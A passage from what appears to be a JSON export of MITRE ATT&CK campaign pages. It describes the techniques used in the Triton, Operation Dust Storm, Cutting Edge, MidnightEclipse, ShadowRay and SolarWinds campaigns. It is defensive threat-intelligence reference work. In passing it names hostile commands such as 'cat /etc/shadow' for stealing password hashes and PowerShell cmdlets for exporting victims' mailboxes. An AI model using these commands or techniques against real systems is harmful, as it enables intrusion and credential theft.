defined in XML files.[4] ICS T0830 Adversary-in-the-Middle In the Triton Safety Instrumented System Attack, TEMP.Veles changed phone numbers tied to certain specific accounts in a designated contact list. They then used the changed phone numbers to redirect network traffic to websites controlled by them, thereby allowing them to capture and use any login codes sent to the devices via text message.[1] ICS T0807 Command-Line Interface In the Triton Safety Instrumented System Attack, TEMP.Veles\u2019 tool took one option from the command line, which was a single IP address of the target Triconex device.[5] ICS T0872 Indicator Removal on Host In the Triton Safety Instrumented System Attack, TEMP.Veles would programmatically return the controller to a normal running state if the Triton malware failed. If the controller could not recover in a defined time window, TEMP.Veles programmatically overwrote their malicious program with invalid data.[5] ICS T0867 Lateral Tool Transfer In the Triton Safety Instrumented System Attack, TEMP.Veles made attempts on multiple victim machines to transfer and execute the WMImplant tool.[4] ICS T0828 Loss of Productivity and Revenue In the Triton Safety Instrumented System Attack, TEMP.Veles tripped a controller into a failed safe state, which caused an automatic shutdown of the plant, this resulted in a pause of plant operations for more than a week. Thereby impacting industrial processes and halting productivity.[5] ICS T0843 Program Download In the Triton Safety Instrumented System Attack, TEMP.Veles downloaded multiple rounds of control logic to the Safety Instrumented System (SIS) controllers through a program append operation.[5] ICS T0886 Remote Services In the Triton Safety Instrumented System Attack, TEMP.Veles utilized remote desktop protocol (RDP) jump boxes, poorly configured OT firewalls [1], along with other traditional malware backdoors, to move into the ICS environment.[2][1] ICS T0853 Scripting In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant.[4] ICS T0855 Unauthorized Command Message In the Triton Safety Instrumented System Attack, TEMP.Veles leveraged Triton to send unauthorized command messages to the Triconex safety controllers.[2] ICS T0859 Valid Accounts In the Triton Safety Instrumented System Attack, TEMP.Veles used valid credentials when laterally moving through RDP jump boxes into the ICS environment.[2] Software ID Name Description S0002 Mimikatz [2] S1009 Triton TEMP.Veles leveraged Triton to interact and disrupt Triconex safety instrumented systems throughout this campaign.[4][2][5] References Blake Sobczak. (2019, March 7). The inside story of the world\u2019s most dangerous malware. Retrieved March 25, 2024. Miller, S. Reese, E. (2018, June 7). A Totally Tubular Treatise on TRITON and TriStation. Retrieved November 17, 2024. Johnson, B, et. al. (2017, December 14). Attackers Deploy New ICS Attack Framework \"TRITON\" and Cause Operational Disruption to Critical Infrastructure. Retrieved January 6, 2021. FireEye Intelligence . (2018, October 23). TRITON Attribution: Russian Government-Owned Lab Most Likely Built Custom Intrusion Tools for TRITON Attackers. Retrieved April 16, 2019. Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer. (2017, December 14). Attackers Deploy New ICS Attack Framework \u201cTRITON\u201d and Cause Operational Disruption to Critical Infrastructure. Retrieved January 12, 2018. "
},
{
"id": 443,
"title": "Operation Dust Storm, Campaign C0016",
"path": "/campaigns/C0016/index.html",
"content": " Operation Dust Storm Operation Dust Storm was a long-standing persistent cyber espionage campaign that targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries. By 2015, the Operation Dust Storm threat actors shifted from government and defense-related intelligence targets to Japanese companies or Japanese subdivisions of larger foreign organizations supporting Japan's critical infrastructure, including electricity generation, oil and natural gas, finance, transportation, and construction.[1] Operation Dust Storm threat actors also began to use Android backdoors in their operations by 2015, with all identified victims at the time residing in Japan or South Korea.[1] ID: C0016 First Seen: January 2010 [1] Last Seen: February 2016 [1] Version: 1.1 Created: 29 September 2022 Last Modified: 11 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For Operation Dust Storm, the threat actors established domains as part of their operational infrastructure.[1] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic During Operation Dust Storm, the threat actors used Visual Basic scripts.[1] .007 Command and Scripting Interpreter: JavaScript During Operation Dust Storm, the threat actors used JavaScript code.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During Operation Dust Storm, attackers used VBS code to decode payloads.[1] Enterprise T1189 Drive-by Compromise During Operation Dust Storm, the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322.[1] Enterprise T1568 Dynamic Resolution For Operation Dust Storm, the threat actors used dynamic DNS domains from a variety of free providers, including No-IP, Oray, and 3322.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts For Operation Dust Storm, the threat actors established email addresses to register domains for their operations.[1] Enterprise T1203 Exploitation for Client Execution During Operation Dust Storm, the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.[1] Enterprise T1036 Masquerading For Operation Dust Storm, the threat actors disguised some executables as JPG files.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing For Operation Dust Storm, the threat actors used UPX to pack some payloads.[1] .013 Obfuscated Files or Information: Encrypted/Encoded File During Operation Dust Storm, the threat actors encoded some payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment During Operation Dust Storm, the threat actors sent spearphishing emails that contained a malicious Microsoft Word document.[1] .002 Phishing: Spearphishing Link During Operation Dust Storm, the threat actors sent spearphishing emails containing a malicious link.[1] Enterprise T1518 Software Discovery During Operation Dust Storm, the threat actors deployed a file called DeployJava.js to fingerprint installed software on a victim system prior to exploit delivery.[1] Enterprise T1218 .005 System Binary Proxy Execution: Mshta During Operation Dust Storm, the threat actors executed JavaScript code via mshta.exe.[1] Enterprise T1204 .001 User Execution: Malicious Link During Operation Dust Storm, the threat actors relied on a victim clicking on a malicious link sent via email.[1] .002 User Execution: Malicious File During Operation Dust Storm, the threat actors relied on potential victims to open a malicious Microsoft Word document sent via email.[1] Mobile T1533 Data from Local System During Operation Dust Storm, the threat actors used Android backdoors capable of exfiltrating specific files directly from the infected devices.[1] Mobile T1646 Exfiltration Over C2 Channel During Operation Dust Storm, the threat actors used Android backdoors that would send information and data from a victim's mobile device to the C2 servers.[1] Mobile T1420 File and Directory Discovery During Operation Dust Storm, the threat actors used Android backdoors capable of enumerating specific files on the infected devices.[1] Mobile T1636 .004 Protected User Data: SMS Messages During Operation Dust Storm, the threat actors used Android backdoors to continually forward all SMS messages and call information back to their C2 servers.[1] Software ID Name Description S0032 gh0st RAT [1] S0084 Mis-Type [1] S0083 Misdat [1] S0012 PoisonIvy [1] S0085 S-Type [1] S0086 ZLib [1] References Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021. "
},
{
"id": 444,
"title": "Cutting Edge, Campaign C0029",
"path": "/campaigns/C0029/index.html",
"content": " Cutting Edge Cutting Edge was a campaign conducted by suspected China-nexus espionage actors, variously identified as UNC5221/UTA0178 and UNC5325, that began as early as December 2023 with the exploitation of zero-day vulnerabilities in Ivanti Connect Secure (previously Pulse Secure) VPN appliances. Cutting Edge targeted the U.S. defense industrial base and multiple sectors globally including telecommunications, financial, aerospace, and technology. Cutting Edge featured the use of defense evasion and living-off-the-land (LoTL) techniques along with the deployment of web shells and other custom malware.[1][2][3][4][5] ID: C0029 First Seen: December 2023 [1][2] Last Seen: February 2024 [5] Version: 1.0 Created: 01 March 2024 Last Modified: 28 March 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1595 .002 Active Scanning: Vulnerability Scanning During Cutting Edge, threat actors used the publicly available Interactsh tool to identify Ivanti Connect Secure VPNs vulnerable to CVE-2024-21893.[5] Enterprise T1071 .004 Application Layer Protocol: DNS During Cutting Edge, threat actors used DNS to tunnel IPv4 C2 traffic.[4] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During Cutting Edge, threat actors saved collected data to a tar archive.[4] Enterprise T1059 Command and Scripting Interpreter During Cutting Edge, threat actors used Perl scripts to enable the deployment of the THINSPOOL shell script dropper and for enumerating host data.[4][1] .006 Python During Cutting Edge, threat actors used a Python reverse shell and the PySoxy SOCKS5 proxy tool.[2][5] Enterprise T1554 Compromise Host Software Binary During Cutting Edge, threat actors trojanized legitimate files in Ivanti Connect Secure appliances with malicious code.[1][2][4] Enterprise T1584 .008 Compromise Infrastructure: Network Devices During Cutting Edge, threat actors used compromised and out-of-support Cyberoam VPN appliances for C2.[1][3] Enterprise T1005 Data from Local System During Cutting Edge, threat actors stole the running configuration and cache data from targeted Ivanti Connect Secure VPNs.[2][4] Enterprise T1190 Exploit Public-Facing Application During Cutting Edge, threat actors exploited CVE-2023-46805 and CVE-2024-21887 in Ivanti Connect Secure VPN appliances to enable authentication bypass and command injection. A server-side request forgery (SSRF) vulnerability, CVE-2024-21893, was identified later and used to bypass mitigations for the initial two vulnerabilities by chaining with CVE-2024-21887.[1][2][3][4][5] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During Cutting Edge, threat actors disabled logging and modified the compcheckresult.cgi component to edit the Ivanti Connect Secure built-in Integrity Checker exclusion list to evade detection.[4][2] Enterprise T1070 Indicator Removal During Cutting Edge, threat actors cleared logs to remove traces of their activity and restored compromised systems to a clean state to bypass manufacturer mitigations for CVE-2023-46805 and CVE-2024-21887.[4][2] .004 File Deletion During Cutting Edge, threat actors deleted /tmp/test1.txt on compromised Ivanti Connect Secure VPNs which was used to hold stolen configuration and cache files.[4][5] .006 Timestomp During Cutting Edge, threat actors changed timestamps of multiple files on compromised Ivanti Secure Connect VPNs to conceal malicious activity.[4][5] Enterprise T1105 Ingress Tool Transfer During Cutting Edge, threat actors leveraged exploits to download remote files to Ivanti Connect Secure VPNs.[2] Enterprise T1056 .001 Input Capture: Keylogging During Cutting Edge, threat actors modified a JavaScript file on the Web SSL VPN component of Ivanti Connect Secure devices to keylog credentials.[2] .003 Input Capture: Web Portal Capture During Cutting Edge, threat actors modified the JavaScript loaded by the Ivanti Connect Secure login page to capture credentials entered.[2] Enterprise T1095 Non-Application Layer Protocol During Cutting Edge, threat actors used the Unix socket and a reverse TCP shell for C2 communications.[5] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File During Cutting Edge, threat actors used a Base64-encoded Python script to write a patched version of the Ivanti Connect Secure dsls binary.[4] Enterprise T1588 .002 Obtain Capabilities: Tool During Cutting Edge, threat actors leveraged tools including Interactsh to identify vulnerable targets, PySoxy to simultaneously dispatch traffic between multiple endpoints, BusyBox to enable post exploitation activities, and Kubo Injector to inject shared objects into process memory.[1][5] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory During Cutting Edge, threat actors used Task Manager to dump LSASS memory from Windows devices to disk.[2] .003 OS Credential Dumping: NTDS During Cutting Edge, threat actors accessed and mounted virtual hard disk backups to extract ntds.dit.[2] Enterprise T1055 Process Injection During Cutting Edge, threat actors used malicious SparkGateway plugins to inject shared objects into web process memory on compromised Ivanti Secure Connect VPNs to enable deployment of backdoors.[5] Enterprise T1572 Protocol Tunneling During Cutting Edge, threat actors used Iodine to tunnel IPv4 traffic over DNS.[4] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During Cutting Edge, threat actors used RDP with compromised credentials for lateral movement.[2] .002 Remote Services: SMB/Windows Admin Shares During Cutting Edge, threat actors moved laterally using compromised credentials to connect to internal Windows systems with SMB.[2] .004 Remote Services: SSH During Cutting Edge, threat actors used SSH for lateral movement.[2] Enterprise T1594 Search Victim-Owned Websites During Cutting Edge, threat actors peformed reconnaissance of victims' internal websites via proxied connections.[2] Enterprise T1505 .003 Server Software Component: Web Shell During Cutting Edge, threat actors used multiple web shells to maintain presence on compromised Connect Secure appliances such as WIREFIRE, GLASSTOKEN, BUSHWALK, LIGHTWIRE, and FRAMESTING.[1][2] Enterprise T1082 System Information Discovery During Cutting Edge, threat actors used the ENUM4LINUX Perl script for discovery on Windows and Samba hosts.[4] Enterprise T1205 Traffic Signaling During Cutting Edge, threat actors sent a magic 48-byte sequence to enable the PITSOCK backdoor to communicate via the /tmp/clientsDownload.sock socket.[5] Enterprise T1078 .002 Valid Accounts: Domain Accounts During Cutting Edge, threat actors used compromised VPN accounts for lateral movement on targeted networks.[2] Software ID Name Description S1118 BUSHWALK [4][5] S0488 CrackMapExec [4] S1120 FRAMESTING [4] S1117 GLASSTOKEN [2] S0357 Impacket [4] S1119 LIGHTWIRE [4] S1121 LITTLELAMB.WOOLTEA [5] S1123 PITSTOP [5] S1116 WARPWIRE [1][2][3] S1115 WIREFIRE [1] S1114 ZIPLINE [1] References McLellan, T. et al. (2024, January 12). Cutting Edge: Suspected APT Targets Ivanti Connect Secure VPN in New Zero-Day Exploitation. Retrieved February 27, 2024. Meltzer, M. et al. (2024, January 10). Active Exploitation of Two Zero-Day Vulnerabilities in Ivanti Connect Secure VPN. Retrieved February 27, 2024. Gurkok, C. et al. (2024, January 15). Ivanti Connect Secure VPN Exploitation Goes Global. Retrieved February 27, 2024. Lin, M. et al. (2024, January 31). Cutting Edge, Part 2: Investigating Ivanti Connect Secure VPN Zero-Day Exploitation. Retrieved February 27, 2024. Lin, M. et al. (2024, February 27). Cutting Edge, Part 3: Investigating Ivanti Connect Secure VPN Exploitation and Persistence Attempts. Retrieved March 1, 2024. "
},
{
"id": 445,
"title": "Operation MidnightEclipse, Campaign C0048",
"path": "/campaigns/C0048/index.html",
"content": " Operation MidnightEclipse Operation MidnightEclipse was a campaign conducted in March and April 2024 that involved initial exploit of zero-day vulnerability CVE-2024-3400, a critical command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS.[1][2] ID: C0048 First Seen: March 2024 [1] Last Seen: April 2024 [1][2] Version: 1.0 Created: 15 January 2025 Last Modified: 15 January 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Operation MidnightEclipse, threat actors used wget via HTTP to retrieve payloads.[1][2] Enterprise T1059 .004 Command and Scripting Interpreter: Unix Shell During Operation MidnightEclipse, threat actors piped output from stdout to bash for execution.[1][2] Enterprise T1584 .003 Compromise Infrastructure: Virtual Private Server During Operation MidnightEclipse, threat actors abused Virtual Private Servers to store malicious files.[1] .006 Compromise Infrastructure: Web Services During Operation MidnightEclipse, threat actors abused compromised AWS buckets to store files.[1] Enterprise T1005 Data from Local System During Operation MidnightEclipse, threat actors stole saved cookies and login data from targeted systems.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During Operation MidnightEclipse, threat actors copied files to the web application folder on compromised devices for exfiltration.[2] Enterprise T1190 Exploit Public-Facing Application During Operation MidnightEclipse, threat actors exploited CVE-2024-3400 in Palo Alto Networks GlobalProtect.[1][2] Enterprise T1105 Ingress Tool Transfer During Operation MidnightEclipse, threat actors downloaded additional payloads on compromised devices.[1][2] Enterprise T1559 Inter-Process Communication During Operation MidnightEclipse, threat actors wrote output to stdout then piped it to bash for execution.[1] Enterprise T1588 .002 Obtain Capabilities: Tool During Operation MidnightEclipse, threat actors used the GO Simple Tunnel (GOST) reverse proxy tool.[1] Enterprise T1003 .003 OS Credential Dumping: NTDS During Operation MidnightEclipse, threat actors obtained active directory credentials via the NTDS.DIT file.[1] Enterprise T1090 Proxy During Operation MidnightEclipse, threat actors used the GO Simple Tunnel reverse proxy tool.[1] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares During Operation MidnightEclipse, threat actors used SMB to pivot internally in victim networks.[1] .006 Remote Services: Windows Remote Management During Operation MidnightEclipse, threat actors used WinRM to move laterally in targeted networks.[1] Enterprise T1053 .003 Scheduled Task/Job: Cron During Operation MidnightEclipse, threat actors configured cron jobs to retrieve payloads from actor-controlled infrastructure.[1][2] Enterprise T1078 Valid Accounts During Operation MidnightEclipse, threat actors extracted sensitive credentials while moving laterally through compromised networks.[1] .002 Domain Accounts During Operation MidnightEclipse, threat actors used a compromised domain admin account to move laterally.[1] Software ID Name Description S1164 UPSTYLE During Operation MidnightEclipse, threat actors made multiple attempts to install UPSTYLE[1][2] References Volexity Threat Research. (2024, April 12). Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400). Retrieved November 20, 2024. Unit 42. (2024, April 12). Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 . Retrieved January 15, 2025. "
},
{
"id": 446,
"title": "ShadowRay, Campaign C0045",
"path": "/campaigns/C0045/index.html",
"content": " ShadowRay ShadowRay was a campaign that began in late 2023 targeting the education, cryptocurrency, biopharma, and other sectors through a vulnerability (CVE-2023-48022) in the Ray AI framework named ShadowRay. According to security researchers ShadowRay was the first known instance of AI workloads being activley exploited in the wild through vulnerabilities in AI infrastructure. CVE-2023-48022, which allows access to compute resources and sensitive data for exposed instances, remains unpatched and has been disputed by the vendor as they maintain that Ray is not intended for use outside of a strictly controlled network environment.[1] ID: C0045 First Seen: September 2023 [1] Last Seen: March 2024 [1] Contributors: Shun Miyazaki, NEC Corporation; Sareena Karapoola, NEC Corporation India; Pooja Natarajan, NEC Corporation India Version: 1.0 Created: 02 December 2024 Last Modified: 02 December 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .006 Command and Scripting Interpreter: Python During ShadowRay, threat actors used the Python pty module to open reverse shells.[1] Enterprise T1546 .004 Event Triggered Execution: Unix Shell Configuration Modification During ShadowRay, threat actors executed commands on interactive and reverse shells.[1] Enterprise T1190 Exploit Public-Facing Application During ShadowRay, threat actors exploited CVE-2023-48022 on publicly exposed Ray servers to steal computing power and to expose sensitive data.[1] Enterprise T1068 Exploitation for Privilege Escalation During ShadowRay, threat actors downloaded a privilege escalation payload to gain root access.[1] Enterprise T1105 Ingress Tool Transfer During ShadowRay, threat actors downloaded and executed the XMRig miner on targeted hosts.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File During ShadowRay, threat actors used Base64-encrypted Python code to evade detection.[1] Enterprise T1588 .002 Obtain Capabilities: Tool During ShadowRay, threat actors used tools including the XMRig miner and Interactsh.[1] Enterprise T1003 .008 OS Credential Dumping: /etc/passwd and /etc/shadow During ShadowRay, threat actors used cat /etc/shadow to steal password hashes.[1] Enterprise T1496 .001 Resource Hijacking: Compute Hijacking During ShadowRay, threat actors leveraged graphics processing units (GPU) on compromised nodes for cryptocurrency mining.[1] Enterprise T1016 System Network Configuration Discovery During ShadowRay, threat actors invoked DNS queries from targeted machines to identify their IP addresses.[1] References Lumelsly, A. et al. (2024, March 26). ShadowRay: First Known Attack Campaign Targeting AI Workloads Actively Exploited In The Wild. Retrieved December 2, 2024. "
},
{
"id": 447,
"title": "SolarWinds Compromise, Campaign C0024",
"path": "/campaigns/C0024/index.html",
"content": " SolarWinds Compromise The SolarWinds Compromise was a sophisticated supply chain cyber operation conducted by APT29 that was discovered in mid-December 2020. APT29 used customized malware to inject malicious code into the SolarWinds Orion software build process that was later distributed through a normal software update; they also used password spraying, token theft, API abuse, spear phishing, and other supply chain attacks to compromise user accounts and leverage their associated access. Victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. This activity has been labled the StellarParticle campaign in industry reporting.[1] Industry reporting also initially referred to the actors involved in this campaign as UNC2452, NOBELIUM, Dark Halo, and SolarStorm.[2][3][4][5][1][6][7][8] In April 2021, the US and UK governments attributed the SolarWinds Compromise to Russia's Foreign Intelligence Service (SVR); public statements included citations to APT29, Cozy Bear, and The Dukes.[9][10][11] The US government assessed that of the approximately 18,000 affected public and private sector customers of Solar Winds\u2019 Orion product, a much smaller number were compromised by follow-on APT29 activity on their systems.[12] ID: C0024 First Seen: August 2019 [6] Last Seen: January 2021 [13] Version: 1.1 Created: 24 March 2023 Last Modified: 03 September 2024 Version Permalink Live Version Groups ID Name Description G0016 APT29 [9][10][11] Techniques Used Domain ID Name Use Enterprise T1087 Account Discovery During the SolarWinds Compromise, APT29 obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.[5] .002 Domain Account During the SolarWinds Compromise, APT29 used PowerShell to discover domain accounts by exectuing Get-ADUser and Get-ADGroupMember.[1][14] Enterprise T1098 .001 Account Manipulation: Additional Cloud Credentials During the SolarWinds Compromise, APT29 added credentials to OAuth Applications and Service Principals.[15][1] .002 Account Manipulation: Additional Email Delegate Permissions During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.[5][15][16] .003 Account Manipulation: Additional Cloud Roles During the SolarWinds Compromise, APT29 granted company administrator privileges to a newly created service principle.[1] .005 Account Manipulation: Device Registration During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command.[5] Enterprise T1583 .001 Acquire Infrastructure: Domains For the SolarWinds Compromise, APT29 acquired C2 domains, sometimes through resellers.[17][18] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration.[5] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During the SolarWinds Compromise, APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; APT29 also compressed text files into zipped archives.[5][19][1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands.[5][7][1] .003 Command and Scripting Interpreter: Windows Command Shell During the SolarWinds Compromise, APT29 used cmd.exe to execute commands on remote machines.[5][7] .005 Command and Scripting Interpreter: Visual Basic For the SolarWinds Compromise, APT29 wrote malware such as Sibot in Visual Basic.[20] Enterprise T1584 .001 Compromise Infrastructure: Domains For the SolarWinds Compromise, APT29 compromised domains to use for C2.[17] Enterprise T1555 Credentials from Password Stores During the SolarWinds Compromise, APT29 used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.[19] .003 Credentials from Web Browsers During the SolarWinds Compromise, APT29 stole users' saved passwords from Chrome.[1] Enterprise T1213 Data from Information Repositories During the SolarWinds Compromise, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations.[1] .003 Code Repositories During the SolarWinds Compromise, APT29 downloaded source code from code repositories.[8] Enterprise T1005 Data from Local System During the SolarWinds Compromise, APT29 extracted files from compromised networks.[5] Enterprise T1074 .002 Data Staged: Remote Data Staging During the SolarWinds Compromise, APT29 staged data and files in password-protected archives on a victim's OWA server.[5] Enterprise T1140 Deobfuscate/Decode Files or Information During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware.[21] Enterprise T1587 .001 Develop Capabilities: Malware For the SolarWinds Compromise, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP.[4][22][19] Enterprise T1484 .002 Domain or Tenant Policy Modification: Trust Modification During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.[14][23] Enterprise T1482 Domain Trust Discovery During the SolarWinds Compromise, APT29 used the Get-AcceptedDomain PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell.[5] They also used AdFind to enumerate domains and to discover trust between federated domains.[1][19] Enterprise T1568 Dynamic Resolution During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.[5] Enterprise T1114 .002 Email Collection: Remote Email Collection During the SolarWinds Compromise, APT29 collected emails from specific individuals, such as executives and IT staff, using New-MailboxExportRequest followed by Get-MailboxExportRequest.[5][20] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription During the SolarWinds Compromise, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with rundll32.exe.[19][23] Enterprise T1048 .002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol During the SolarWinds Compromise, APT29 exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.[5] Enterprise T1190 Exploit Public-Facing Application During the SolarWinds Compromise, APT29 exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.[5][20] Enterprise T1133 External Remote Services For the SolarWinds Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools.[17][1] Enterprise T1083 File and Directory Discovery During the SolarWinds Compromise, APT29 obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory.[5] Enterprise T1606 .001 Forge Web Credentials: Web Cookies During the SolarWinds Compromise, APT29 bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.[5] .002 Forge Web Credentials: SAML Tokens During the SolarWinds Compromise, APT29 created tokens using compromised SAML signing certificates.[15][14] Enterprise T1589 .001 Gather Victim Identity Information: Credentials For the SolarWinds Compromise, APT29 conducted credential theft operations to obtain credentials to be used for access to victim environments.[1] Enterprise T1665 Hide Infrastructure During the SolarWinds Compromise, APT29 set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.[4] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During the SolarWinds Compromise, APT29 used the service control manager on a remote system to disable services associated with security monitoring products.[19] .002 Impair Defenses: Disable Windows Event Logging During the SolarWinds Compromise, APT29, used AUDITPOL to prevent the collection of audit logs.[19] .004 Impair Defenses: Disable or Modify System Firewall During the SolarWinds Compromise, APT29 used netsh to configure firewall rules that limited certain UDP outbound packets.[19] Enterprise T1070 Indicator Removal During the SolarWinds Compromise, APT29 temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.[4] .004 File Deletion During the SolarWinds Compromise, APT29 routinely removed their tools, including custom backdoors, once remote access was achieved.[4] .006 Timestomp During the SolarWinds Compromise, APT29 modified timestamps of backdoors to match legitimate Windows files.[19] .008 Clear Mailbox Data During the SolarWinds Compromise, APT29 removed evidence of email export requests using Remove-MailboxExportRequest.[5] Enterprise T1105 Ingress Tool Transfer During the SolarWinds Compromise, APT29 downloaded additional malware, such as TEARDROP and Cobalt Strike, onto a compromised host following initial access.[4] Enterprise T1036 .004 Masquerading: Masquerade Task or Service During the SolarWinds Compromise, APT29 named tasks \\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager in order to appear legitimate.[5] .005 Masquerading: Match Legitimate Resource Name or Location During the SolarWinds Compromise, APT29 renamed software and DLLs with legitimate names to appear benign.[5][7] Enterprise T1003 .006 OS Credential Dumping: DCSync During the SolarWinds Compromise, APT29 used privileged accounts to replicate directory service data with domain controllers.[23][19][1] Enterprise T1069 Permission Groups Discovery During the SolarWinds Compromise, APT29 used the Get-ManagementRoleAssignment PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.[5] .002 Domain Groups During the SolarWinds Compromise, APT29 used AdFind to enumerate domain groups.[1] Enterprise T1057 Process Discovery During the SolarWinds Compromise, APT29 used multiple command-line utilities to enumerate running processes.[5][19][1] Enterprise T1090 .001 Proxy: Internal Proxy During the SolarWinds Compromise, APT29 used SSH port forwarding capabilities on public-facing systems, and configured at least one instance of Cobalt Strike to use a network pipe over SMB.[1][21] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During the SolarWinds Compromise, APT29 used RDP sessions from public-facing systems to internal servers.[1] .002 Remote Services: SMB/Windows Admin Shares During the SolarWinds Compromise, APT29 used administrative accounts to connect over SMB to targeted users.[1] .006 Remote Services: Windows Remote Management During the SolarWinds Compromise, APT29 used WinRM via PowerShell to execute commands and payloads on remote hosts.[21] Enterprise T1018 Remote System Discovery During the SolarWinds Compromise, APT29 used AdFind to enumerate remote systems.[19] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During the SolarWinds Compromise, APT29 used scheduler and schtasks to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted.[5][4][22] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting During the SolarWinds Compromise, APT29 obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.[19] Enterprise T1539 Steal Web Session Cookie During the SolarWinds Compromise, APT29 stole Chrome browser cookies by copying the Chrome profile directories of targeted users.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing During the SolarWinds Compromise, APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.[4] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain During the SolarWinds Compromise, APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software.[3][4][20][19] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 During the SolarWinds Compromise, APT29 used Rundll32.exe to execute payloads.[15][19] Enterprise T1082 System Information Discovery During the SolarWinds Compromise, APT29 used fsutil to check available free space before executing actions that might create large files on disk.[19] Enterprise T1016 .001 System Network Configuration Discovery: Internet Connection Discovery During the SolarWinds Compromise, APT29 used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.[17] Enterprise T1199 Trusted Relationship During the SolarWinds Compromise, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.[20][1] Enterprise T1552 .004 Unsecured Credentials: Private Keys During the SolarWinds Compromise, APT29 obtained PKI keys, certificate files, and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.[23][20] Enterprise T1550 Use Alternate Authentication Material During the SolarWinds Compromise, APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services.[23][14] .001 Application Access Token During the SolarWinds Compromise, APT29 used compromised service principals to make changes to the Office 365 environment.[1] .004 Web Session Cookie During the SolarWinds Compromise, APT29 used stolen cookies to access cloud resources and a forged duo-sid cookie to bypass MFA set on an email account.[5][1] 